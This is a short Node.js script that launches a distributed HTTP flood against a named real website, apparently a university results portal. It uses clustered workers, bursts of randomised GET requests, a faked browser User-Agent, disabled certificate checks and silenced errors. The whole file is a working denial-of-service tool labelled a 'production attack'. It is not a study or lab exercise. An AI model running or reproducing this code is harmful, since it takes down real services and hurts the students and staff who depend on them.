const cluster = require('cluster');
const https = require('https');
const os = require('os');

// PRODUCTION CONFIG
const TARGET_URL = 'https://result.isi.ui.edu.ng/';
const REQUESTS_PER_SECOND = 100000000;  // 10x more
const THREADS = os.cpus().length * 2;

console.log(`💥 PRODUCTION ATTACK: ${REQUESTS_PER_SECOND} req/s x ${THREADS} workers`);

if (cluster.isMaster) {
    for (let i = 0; i < THREADS; i++) cluster.fork();
} else {
    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: 1000,
        rejectUnauthorized: false
    });

    let total = 0;
    const spam = () => {
        for (let i = 0; i < REQUESTS_PER_SECOND / THREADS * 2; i++) {  // Double burst
            const req = https.request({
                hostname: 'result.isi.ui.edu.ng',
                port: 443,
                path: '/' + Math.random().toString(36).substr(2),
                headers: { 'User-Agent': 'Mozilla/5.0' },
                agent,
                method: 'GET'
            }, () => {});
            req.on('error', () => {});  // SILENT ERRORS = PRODUCTION
            req.end();
            total++;
        }
    };

    setInterval(spam, 200);  // 5x faster loop
    setInterval(() => console.log(`Worker ${process.pid}: ${total} total`), 30000);
}